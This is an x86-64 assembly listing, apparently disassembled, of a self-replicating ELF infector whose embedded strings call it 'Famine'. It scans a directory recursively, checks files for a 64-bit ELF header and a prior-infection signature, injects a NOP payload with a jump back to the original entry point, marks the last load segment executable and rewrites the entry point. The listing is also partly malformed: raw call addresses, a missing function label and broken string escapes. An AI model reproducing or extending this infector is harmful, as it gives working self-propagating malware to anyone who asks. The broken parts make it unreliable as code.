section .text
    global _start


_start:       
    push   rax
    lea    rdi,[rip+0xe23]        # 0x2042
    call   0x10c9 <famine>
    xor    edx,edx
    xor    r8d,r8d
    xor    ecx,ecx
    xor    esi,esi
    mov    edi,0x3c
    call   0x1357 <ft_syscall>
    pop    rdx
    ret    

virus:        
    push   r12
    mov    rax,rdi
    lea    rsi,[rip+0xff4]        # 0x2000
    xor    r8d,r8d
    push   rbp
    mov    ecx,0x3d
    mov    edx,0x2
    push   rbx
    add    rsp,0xffffffffffffff80
    lea    rdi,[rsp+0x3]
    rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi]
    mov    rsi,rax
    mov    edi,0x2
    call   0x1357 <ft_syscall>
    test   eax,eax
    js     0x10c0 <virus+192>
    movsxd rbx,eax
    lea    rbp,[rsp+0x40]
    xor    r8d,r8d
    xor    edi,edi
    mov    ecx,0x40
    mov    rdx,rbp
    mov    rsi,rbx
    mov    r12d,eax
    call   0x1357 <ft_syscall>
    cmp    eax,0x3f
    jle    0x10c0 <virus+192>
    sub    rsp,0x40
    mov    ecx,0x10
    mov    rsi,rbp
    mov    rdi,rsp
    rep movs DWORD PTR es:[rdi],DWORD PTR ds:[rsi]
    call   0x1417 <check_file>
    add    rsp,0x40
    test   eax,eax
    jne    0x10c0 <virus+192>
    lea    rsi,[rsp+0x3]
    mov    edi,r12d
    call   0x1475 <checkSignature>
    dec    eax
    je     0x10ac <virus+172>
    sub    rsp,0x40
    mov    ecx,0x10
    mov    rsi,rbp
    mov    rdi,rsp
    rep movs DWORD PTR es:[rdi],DWORD PTR ds:[rsi]
    mov    edi,r12d
    call   0x16c3 <writeFile>
    add    rsp,0x40
    xor    r8d,r8d
    xor    ecx,ecx
    xor    edx,edx
    mov    rsi,rbx
    mov    edi,0x3
    call   0x1357 <ft_syscall>
    sub    rsp,0xffffffffffffff80
    pop    rbx
    pop    rbp
    pop    r12
    ret

famine:       
    push   r15
    mov    rdx,rdi
    xor    r8d,r8d
    mov    ecx,0x10800
    push   r14
    mov    rsi,0xffffffffffffff9c
    push   r13
    push   r12
    push   rbp
    push   rbx
    sub    rsp,0x1448
    mov    QWORD PTR [rsp+0x10],rdi
    mov    edi,0x101
    call   0x1357 <ft_syscall>
    mov    edx,0x1
    cmp    eax,0xffffffff
    je     0x1203 <famine+314>
    cdqe   
    mov    QWORD PTR [rsp+0x18],rax
    mov    rsi,QWORD PTR [rsp+0x18]
    lea    r14,[rsp+0x28]
    xor    r8d,r8d
    xor    ebp,ebp
    mov    ecx,0x1000
    mov    rdx,r14
    mov    edi,0x4e
    call   0x1357 <ft_syscall>
    mov    rbx,rax
    mov    r15d,eax
    cmp    ebp,r15d
    jge    0x11f9 <famine+304>
    movsxd r12,ebp
    lea    rsi,[rip+0xef4]        # 0x203e
    add    r12,r14
    lea    r13,[r12+0x12]
    mov    rdi,r13
    call   0x13c8 <ft_strcmp>
    test   eax,eax
    je     0x11ec <famine+291>
    lea    rsi,[rip+0xed4]        # 0x203d
    mov    rdi,r13
    call   0x13c8 <ft_strcmp>
    test   eax,eax
    je     0x11ec <famine+291>
    mov    rdi,QWORD PTR [rsp+0x10]
    call   0x138c <ft_strlen>
    mov    rdx,QWORD PTR [rsp+0x10]
    xor    esi,esi
    mov    rcx,rax
    lea    rax,[rsp+0x440]
    mov    rdi,rax
    mov    QWORD PTR [rsp+0x8],rax
    call   0x13e7 <memncat>
    mov    rdi,QWORD PTR [rsp+0x8]
    lea    rsi,[rip+0xe96]        # 0x2040
    call   0x139a <ft_strcat>
    mov    rdi,QWORD PTR [rsp+0x8]
    mov    rsi,r13
    call   0x139a <ft_strcat>
    mov    rdi,QWORD PTR [rsp+0x8]
    call   0x14f7 <isDir>
    mov    rdi,QWORD PTR [rsp+0x8]
    dec    al
    jne    0x11d6 <famine+269>
    call   0x10c9 <famine>
    jmp    0x11db <famine+274>
    call   0x1000 <virus>
    mov    rdi,QWORD PTR [rsp+0x8]
    mov    edx,0x1000
    xor    esi,esi
    call   0x1403 <ft_memset>
    movzx  eax,WORD PTR [r12+0x10]
    add    ebp,eax
    jmp    0x1137 <famine+110>
    test   ebx,ebx
    jg     0x1110 <famine+71>
    xor    edx,edx
    add    rsp,0x1448
    mov    eax,edx
    pop    rbx
    pop    rbp
    pop    r12
    pop    r13
    pop    r14
    pop    r15
    ret

/*************************************************************************************************/
/*                                                                                               */
/*                               insert_tools.c                                                  */
/*                                                                                               */
/*************************************************************************************************/

findLastExecSection:  
    movzx  edx,WORD PTR [rsp+0x44]
    xor    eax,eax
    cmp    edx,eax
    jle    0x1259 <findLastExecSection+32>
    mov    rcx,rax
    shl    rcx,0x6
    test   BYTE PTR [rdi+rcx*1+0x8],0x4
    je     0x1254 <findLastExecSection+27>
    mov    DWORD PTR [rsi],eax
    inc    rax
    jmp    0x1240 <findLastExecSection+7>
    ret    
    mov    rcx,QWORD PTR [rsp+0x60]
    mov    r9,QWORD PTR [rsp+0x70]
    xor    eax,eax
    xor    edx,edx
    movzx  r8d,WORD PTR [rsp+0x44]
    add    r9,rcx
    cmp    r8d,eax
    jle    0x129b <findLastLoadSection+65>
    mov    rsi,rax
    shl    rsi,0x6
    mov    rsi,QWORD PTR [rdi+rsi*1+0x10]
    cmp    rsi,rcx
    jb     0x128c <findLastLoadSection+50>
    cmp    r9,rsi
    jae    0x1294 <findLastLoadSection+58>
    cmp    dl,0x1
    jne    0x1296 <findLastLoadSection+60>
    dec    eax
    ret    
    mov    dl,0x1
    inc    rax
    jmp    0x1271 <findLastLoadSection+23>
    ret
  
get_last_load_segment:        
    movzx  edx,WORD PTR [rsp+0x40]
    mov    eax,0x1
    cmp    edx,eax
    jle    0x12c0 <get_last_load_segment+36>
    cmp    DWORD PTR [rdi+0x38],0x1
    je     0x12b8 <get_last_load_segment+28>
    cmp    DWORD PTR [rdi],0x1
    jne    0x12b8 <get_last_load_segment+28>
    dec    eax
    ret    
    inc    eax
    add    rdi,0x38
    jmp    0x12a6 <get_last_load_segment+10>
    or     eax,0xffffffff
    ret

increaseFileSize:     
    push   r12
    mov    ecx,0x10
    mov    r12,rsi
    push   rbp
    movsxd rbp,edi
    mov    rdx,r12
    push   rbx
    sub    rsp,0xe0
    mov    rdi,rsp
    lea    rsi,[rsp+0x100]
    rep movs DWORD PTR es:[rdi],DWORD PTR ds:[rsi]
    mov    esi,0x8
    mov    edi,0x3
    call   0x1564 <get_section_index>
    add    rsp,0x40
    xor    r8d,r8d
    xor    ecx,ecx
    lea    rdx,[rsp+0x8]
    mov    rsi,rbp
    mov    edi,0x5
    movsxd rbx,eax
    call   0x1357 <ft_syscall>
    mov    rdx,rax
    mov    al,0x1
    test   edx,edx
    js     0x134b <increaseFileSize+135>
    shl    rbx,0x6
    mov    rdx,QWORD PTR [rsp+0x38]
    xor    r8d,r8d
    xor    ecx,ecx
    mov    rax,QWORD PTR [r12+rbx*1+0x20]
    mov    rsi,rbp
    mov    edi,0x4d
    lea    rdx,[rdx+rax*1+0x1000]
    call   0x1357 <ft_syscall>
    shr    eax,0x1f
    add    rsp,0xa0
    pop    rbx
    pop    rbp
    pop    r12
    ret


/*************************************************************************************************/
/*                                                                                               */
/*                               utils.c                                                         */
/*                                                                                               */
/*************************************************************************************************/

ft_syscall:   
    mov    QWORD PTR [rsp-0x8],rdi
    mov    QWORD PTR [rsp-0x10],rsi
    mov    QWORD PTR [rsp-0x18],rdx
    mov    QWORD PTR [rsp-0x20],rcx
    mov    QWORD PTR [rsp-0x28],r8
    mov    rax,QWORD PTR [rsp-0x8]
    mov    rdi,QWORD PTR [rsp-0x10]
    mov    rsi,QWORD PTR [rsp-0x18]
    mov    rdx,QWORD PTR [rsp-0x20]
    mov    rcx,QWORD PTR [rsp-0x28]
    syscall 
    ret

ft_strlen:
    xor    eax,eax
    cmp    BYTE PTR [rdi+rax*1],0x0
    je     0x1399 <ft_strlen+13>
    inc    rax
    jmp    0x138e <ft_strlen+2>
    ret

ft_strcat:    
    test   rdi,rdi
    je     0x13c2 <ft_strcat+40>
    test   rsi,rsi
    je     0x13c2 <ft_strcat+40>
    call   0x138c <ft_strlen>
    add    rdi,rax
    mov    al,BYTE PTR [rsi]
    inc    rsi
    test   al,al
    je     0x13bc <ft_strcat+34>
    mov    BYTE PTR [rdi],al
    inc    rdi
    jmp    0x13ac <ft_strcat+18>
    mov    BYTE PTR [rdi],0x0
    xor    eax,eax
    ret    
    mov    eax,0x1
    ret

ft_strcmp:
    xor    ecx,ecx
    movzx  eax,BYTE PTR [rdi+rcx*1]
    movzx  edx,BYTE PTR [rsi+rcx*1]
    mov    r8d,eax
    or     r8b,dl
    je     0x13e4 <ft_strcmp+28>
    inc    rcx
    cmp    al,dl
    je     0x13ca <ft_strcmp+2>
    sub    eax,edx
    ret    
    xor    eax,eax
    ret

memncat:
    or     rax,0xffffffffffffffff
    add    rdi,rsi
    inc    rax
    cmp    rax,rcx
    je     0x1400 <memncat+25>
    mov    sil,BYTE PTR [rdx+rax*1]
    mov    BYTE PTR [rdi+rax*1],sil
    jmp    0x13ee <memncat+7>
    xor    eax,eax
    ret

ft_memset:    
    mov    rax,rdi
    xor    ecx,ecx
    cmp    rcx,rdx
    je     0x1416 <ft_memset+19>
    mov    BYTE PTR [rax+rcx*1],sil
    inc    rcx
    jmp    0x1408 <ft_memset+5>
    ret

check_file:
    cmp    DWORD PTR [rsp+0x8],0x464c457f
    mov    eax,0x1
    jne    0x143e <check_file+39>
    cmp    BYTE PTR [rsp+0xc],0x2
    jne    0x143e <check_file+39>
    cmp    BYTE PTR [rsp+0xd],0x1
    jne    0x143e <check_file+39>
    xor    eax,eax
    cmp    BYTE PTR [rsp+0xf],0x0
    setne  al
    ret

ft_strstr:
    xor    ecx,ecx
    cmp    rcx,rdx
    je     0x1472 <ft_strstr+51>
    mov    r9,rdx
    xor    eax,eax
    lea    r8,[rdi+rcx*1]
    sub    r9,rcx
    cmp    rax,r9
    je     0x146d <ft_strstr+46>
    mov    r10b,BYTE PTR [rsi+rax*1]
    cmp    BYTE PTR [r8+rax*1],r10b
    jne    0x146d <ft_strstr+46>
    inc    rax
    cmp    BYTE PTR [rsi+rax*1],0x0
    jne    0x1452 <ft_strstr+19>
    mov    al,0x1
    ret    
    inc    rcx
    jmp    0x1441 <ft_strstr+2>
    xor    eax,eax
    ret

checkSignature:
    sub    rsp,0x1030
    movsxd r10,edi
    mov    r9,rsi
    mov    edx,0x1000
    lea    r8,[rsp+0x30]
    xor    esi,esi
    mov    rdi,r8
    call   0x1403 <ft_memset>
    xor    eax,eax
    xor    edx,edx
    mov    QWORD PTR [rsp+0x10],r10
    mov    QWORD PTR [rsp+0x8],rax
    mov    QWORD PTR [rsp+0x18],r8
    mov    QWORD PTR [rsp+0x20],0x1000
    mov    QWORD PTR [rsp+0x28],rdx
    mov    rax,QWORD PTR [rsp+0x8]
    mov    rdi,QWORD PTR [rsp+0x10]
    mov    rsi,QWORD PTR [rsp+0x18]
    mov    rdx,QWORD PTR [rsp+0x20]
    mov    rcx,QWORD PTR [rsp+0x28]
    syscall 
    mov    edx,0x1000
    mov    rsi,r9
    mov    rdi,r8
    call   0x143f <ft_strstr>
    dec    al
    je     0x14ea <checkSignature+117>
    xor    eax,eax
    jmp    0x14ef <checkSignature+122>
    mov    eax,0x1
    add    rsp,0x1030
    ret

isDir:
    sub    rsp,0x48
    lea    rax,[rsp-0x48]
    mov    QWORD PTR [rsp-0x68],rdi
    mov    QWORD PTR [rsp-0x60],rax
    xor    eax,eax
    mov    QWORD PTR [rsp-0x70],0x4
    mov    QWORD PTR [rsp-0x58],rax
    mov    QWORD PTR [rsp-0x50],rax
    mov    rax,QWORD PTR [rsp-0x70]
    mov    rdi,QWORD PTR [rsp-0x68]
    mov    rsi,QWORD PTR [rsp-0x60]
    mov    rdx,QWORD PTR [rsp-0x58]
    mov    rcx,QWORD PTR [rsp-0x50]
    syscall 
    movzx  eax,BYTE PTR [rsp-0x2f]
    shl    eax,0x8
    and    eax,0xf000
    cmp    eax,0x4000
    sete   al
    add    rsp,0x48
    ret

find_offset_nentry_oentry:
    mov    eax,edi
    sub    eax,esi
    cmp    rdi,rsi
    jae    0x1561 <find_offset_nentry_oentry+13>
    mov    eax,esi
    sub    eax,edi
    neg    eax
    ret

get_section_index:
    movzx  esi,WORD PTR [rsp+0x44]
    add    rdx,0x4
    xor    eax,eax
    or     ecx,0xffffffff
    cmp    esi,eax
    jle    0x158b <get_section_index+39>
    cmp    QWORD PTR [rdx+0x4],0x3
    jne    0x1583 <get_section_index+31>
    cmp    DWORD PTR [rdx],0x8
    cmove  ecx,eax
    inc    eax
    add    rdx,0x40
    jmp    0x1572 <get_section_index+14>
    mov    eax,ecx
    ret

/*************************************************************************************************/
/*                                                                                               */
/*                               write_file.c                                                    */
/*                                                                                               */
/*************************************************************************************************/

CleanPayloadAreaAndShiftFileContent:      
    movsxd rdx,edx
    push   r14
    xor    r8d,r8d
    xor    ecx,ecx
    push   r13
    imul   rdx,rdx,0x38
    push   r12
    push   rbp
    movsxd rbp,edi
    mov    edi,0x8
    push   rbx
    lea    rbx,[rsi+rdx*1]
    mov    rsi,rbp
    sub    rsp,0x3000
    mov    rdx,QWORD PTR [rbx+0x20]
    add    rdx,QWORD PTR [rbx+0x8]
    call   0x1357 <ft_syscall>
    mov    r13,rsp
    xor    r8d,r8d
    mov    ecx,0x3000
    mov    rdx,r13
    mov    rsi,rbp
    xor    edi,edi
    call   0x1357 <ft_syscall>
    mov    rdx,QWORD PTR [rbx+0x8]
    xor    r8d,r8d
    xor    ecx,ecx
    mov    r14,rax
    mov    rax,QWORD PTR [rbx+0x28]
    mov    rsi,rbp
    mov    edi,0x8
    lea    r12,[rax+0x1000]
    add    rdx,r12
    call   0x1357 <ft_syscall>
    xor    r8d,r8d
    mov    rcx,r14
    mov    rdx,r13
    mov    rsi,rbp
    mov    edi,0x1
    call   0x1357 <ft_syscall>
    xor    eax,eax
    mov    BYTE PTR [r13+rax*1+0x0],0x0
    inc    rax
    cmp    rax,0x3000
    jne    0x161c <CleanPayloadAreaAndShiftFileContent.constprop.0+142>
    mov    rdx,QWORD PTR [rbx+0x20]
    mov    rsi,rbp
    add    rdx,QWORD PTR [rbx+0x8]
    xor    r8d,r8d
    xor    ecx,ecx
    mov    edi,0x8
    call   0x1357 <ft_syscall>
    mov    rcx,r12
    mov    rdx,r13
    sub    rcx,QWORD PTR [rbx+0x20]
    mov    rsi,rbp
    xor    r8d,r8d
    mov    edi,0x1
    call   0x1357 <ft_syscall>
    add    rsp,0x3000
    pop    rbx
    pop    rbp
    pop    r12
    pop    r13
    pop    r14
    ret

addJump:      
    push   rbx
    movsxd rbx,edi
    xor    r8d,r8d
    mov    ecx,0x1
    mov    edi,0x1
    sub    rsp,0x20
    mov    QWORD PTR [rsp+0x8],rsi
    lea    rdx,[rsp+0x1f]
    mov    rsi,rbx
    sub    QWORD PTR [rsp+0x8],0x4
    mov    BYTE PTR [rsp+0x1f],0xe9
    call   0x1357 <ft_syscall>
    lea    rdx,[rsp+0x8]
    mov    rsi,rbx
    xor    r8d,r8d
    mov    ecx,0x4
    mov    edi,0x1
    call   0x1357 <ft_syscall>
    add    rsp,0x20
    pop    rbx
    ret

writeFile:    
    push   rbp
    xor    r8d,r8d
    xor    ecx,ecx
    mov    rbp,rsp
    push   r15
    push   r14
    mov    r14d,edi
    push   r13
    push   r12
    push   rbx
    sub    rsp,0x78
    mov    rax,QWORD PTR [rbp+0x28]
    mov    r12d,DWORD PTR [rbp+0x4c]
    movzx  ebx,WORD PTR [rbp+0x48]
    mov    r15,QWORD PTR [rbp+0x38]
    mov    QWORD PTR [rbp-0x98],rax
    mov    ax,WORD PTR [rbp+0x4e]
    mov    rdx,r15
    mov    WORD PTR [rbp-0x8a],ax
    movzx  eax,r12w
    shl    rax,0x6
    sub    rsp,rax
    movzx  eax,bx
    imul   rax,rax,0x38
    mov    r13,rsp
    add    rax,0xf
    and    eax,0x7ffff0
    sub    rsp,rax
    movsxd rax,edi
    mov    edi,0x8
    mov    rsi,rax
    mov    QWORD PTR [rbp-0x80],rsp
    mov    QWORD PTR [rbp-0x78],rax
    call   0x1357 <ft_syscall>
    movzx  ecx,WORD PTR [rbp+0x4a]
    movzx  r9d,r12w
    xor    r8d,r8d
    xor    edi,edi
    mov    rdx,r13
    movsxd rsi,r14d
    imul   ecx,r9d
    movsxd rcx,ecx
    call   0x1357 <ft_syscall>
    mov    rdx,QWORD PTR [rbp+0x30]
    xor    r8d,r8d
    xor    ecx,ecx
    movsxd rsi,r14d
    mov    edi,0x8
    call   0x1357 <ft_syscall>
    movzx  ecx,WORD PTR [rbp+0x46]
    mov    rdx,QWORD PTR [rbp-0x80]
    xor    r8d,r8d
    xor    edi,edi
    movsxd rsi,r14d
    imul   ecx,ebx
    movsxd rcx,ecx
    call   0x1357 <ft_syscall>
    sub    rsp,0x40
    lea    rsi,[rbp+0x10]
    mov    ecx,0x10
    mov    rdi,rsp
    rep movs DWORD PTR es:[rdi],DWORD PTR ds:[rsi]
    mov    rdi,QWORD PTR [rbp-0x80]
    call   0x129c <get_last_load_segment>
    mov    rdi,rsp
    mov    ecx,0xe
    sub    rsp,0x40
    movsxd r9,eax
    mov    rax,QWORD PTR [rbp-0x80]
    mov    DWORD PTR [rbp-0x88],r9d
    imul   r9,r9,0x38
    lea    r12,[rax+r9*1]
    mov    rsi,r12
    rep movs DWORD PTR es:[rdi],DWORD PTR ds:[rsi]
    mov    rdi,rsp
    lea    rsi,[rbp+0x10]
    mov    ecx,0x10
    rep movs DWORD PTR es:[rdi],DWORD PTR ds:[rsi]
    mov    rdi,r13
    call   0x125a <findLastLoadSection>
    add    rsp,0x40
    lea    rsi,[rbp+0x10]
    mov    ecx,0x10
    mov    rdi,rsp
    movsxd rbx,eax
    rep movs DWORD PTR es:[rdi],DWORD PTR ds:[rsi]
    mov    rsi,r13
    mov    edi,r14d
    call   0x12c4 <increaseFileSize>
    add    rsp,0x40
    dec    al
    je     0x19b7 <writeFile+756>
    movaps xmm0,XMMWORD PTR [rip+0x83b]        # 0x2050
    mov    edx,DWORD PTR [rbp-0x88]
    mov    edi,r14d
    shl    rbx,0x6
    mov    rsi,QWORD PTR [rbp-0x80]
    add    rbx,r13
    movups XMMWORD PTR [rbp-0x70],xmm0
    movaps xmm0,XMMWORD PTR [rip+0x82c]        # 0x2060
    movups XMMWORD PTR [rbp-0x65],xmm0
    call   0x158e <CleanPayloadAreaAndShiftFileContent.constprop.0>
    xor    r8d,r8d
    xor    ecx,ecx
    mov    rdx,QWORD PTR [r12+0x28]
    movsxd rsi,r14d
    add    rdx,QWORD PTR [r12+0x8]
    mov    edi,0x8
    call   0x1357 <ft_syscall>
    lea    rax,[rbp-0x70]
    xor    r8d,r8d
    movsxd rsi,r14d
    mov    ecx,0x1a
    mov    rdx,rax
    mov    edi,0x1
    mov    QWORD PTR [rbp-0x88],rax
    call   0x1357 <ft_syscall>
    mov    rsi,QWORD PTR [rbp-0x98]
    mov    edi,r14d
    sub    rsi,0x1b
    sub    rsi,QWORD PTR [r12+0x18]
    sub    rsi,QWORD PTR [r12+0x28]
    call   0x1671 <addJump>
    movzx  eax,WORD PTR [rbp-0x8a]
    xor    r8d,r8d
    mov    rdx,QWORD PTR [r12+0x28]
    mov    rsi,QWORD PTR [r12+0x18]
    add    QWORD PTR [rbx+0x20],0x1000
    shl    rax,0x6
    mov    rcx,rdx
    sub    rcx,QWORD PTR [r12+0x20]
    mov    DWORD PTR [rbx+0x4],0x1
    add    rax,r13
    add    rsi,rdx
    or     DWORD PTR [r12+0x4],0x1
    add    rdx,0x1000
    mov    rdi,QWORD PTR [rax+0x18]
    mov    QWORD PTR [rbp+0x28],rsi
    lea    rsi,[rbp+0x10]
    mov    QWORD PTR [r12+0x28],rdx
    lea    rdi,[rcx+rdi*1+0x1000]
    mov    QWORD PTR [r12+0x20],rdx
    xor    edx,edx
    mov    QWORD PTR [rax+0x18],rdi
    lea    rax,[rcx+r15*1+0x1000]
    mov    ecx,0x10
    mov    rdi,QWORD PTR [rbp-0x88]
    mov    QWORD PTR [rbp+0x38],rax
    rep movs DWORD PTR es:[rdi],DWORD PTR ds:[rsi]
    mov    rsi,QWORD PTR [rbp-0x78]
    mov    edi,0x8
    call   0x1357 <ft_syscall>
    mov    rdx,QWORD PTR [rbp-0x88]
    mov    rsi,QWORD PTR [rbp-0x78]
    xor    r8d,r8d
    mov    ecx,0x40
    mov    edi,0x1
    call   0x1357 <ft_syscall>
    mov    rdx,QWORD PTR [rbp-0x50]
    mov    rsi,QWORD PTR [rbp-0x78]
    xor    r8d,r8d
    xor    ecx,ecx
    mov    edi,0x8
    call   0x1357 <ft_syscall>
    movzx  ecx,WORD PTR [rbp-0x38]
    movzx  eax,WORD PTR [rbp-0x3a]
    xor    r8d,r8d
    mov    rdx,QWORD PTR [rbp-0x80]
    mov    rsi,QWORD PTR [rbp-0x78]
    mov    edi,0x1
    imul   ecx,eax
    movsxd rcx,ecx
    call   0x1357 <ft_syscall>
    mov    rdx,QWORD PTR [rbp-0x48]
    mov    rsi,QWORD PTR [rbp-0x78]
    xor    r8d,r8d
    mov    edi,0x8
    xor    ecx,ecx
    call   0x1357 <ft_syscall>
    movzx  ecx,WORD PTR [rbp-0x34]
    movzx  eax,WORD PTR [rbp-0x36]
    xor    r8d,r8d
    mov    rsi,QWORD PTR [rbp-0x78]
    mov    rdx,r13
    mov    edi,0x1
    imul   ecx,eax
    movsxd rcx,ecx
    call   0x1357 <ft_syscall>
    lea    rsp,[rbp-0x28]
    xor    eax,eax
    pop    rbx
    pop    r12
    pop    r13
    pop    r14
    pop    r15
    pop    rbp
    ret

rodat: db 
/*0x2000*/ "\x46\x61\x6d\x69\x6e\x65\x20\x76"
/*0x2008*/ "0x65\x72\x73\x69\x6f\x6e\x20\x31"
/*0x2010*/ "0x2e\x30\x20\x28\x63\x29\x6f\x64"
/*0x2018*/ "0x65\x64\x20\x62\x79\x20\x3c\x70"
/*0x2020*/ "0x67\x6f\x75\x64\x65\x74\x3e\x2d"
/*0x2028*/ "0x3c\x4d\x61\x73\x74\x65\x72\x6d"
/*0x2030*/ "0x69\x6e\x64\x20\x70\x67\x6f\x75"
/*0x2038*/ "0x64\x65\x74\x3e\x00\x2e\x2e\x00"
/*0x2040*/ "0x2f\x00\x2e\x2f\x74\x6d\x70\x00"
/*0x2048*/ "0x00\x00\x00\x00\x00\x00\x00\x00"
/*0x2050*/ "0x90\x90\x90\x90\x90\x90\x90\x90"
/*0x2058*/ "0x90\x90\x90\x90\x90\x90\x90\x90"
/*0x2060*/ "0x90\x90\x90\x90\x90\x90\x90\x90"
/*0x2068*/ "0x90\x90\x90\x90\x90\x90\x90\x00", 0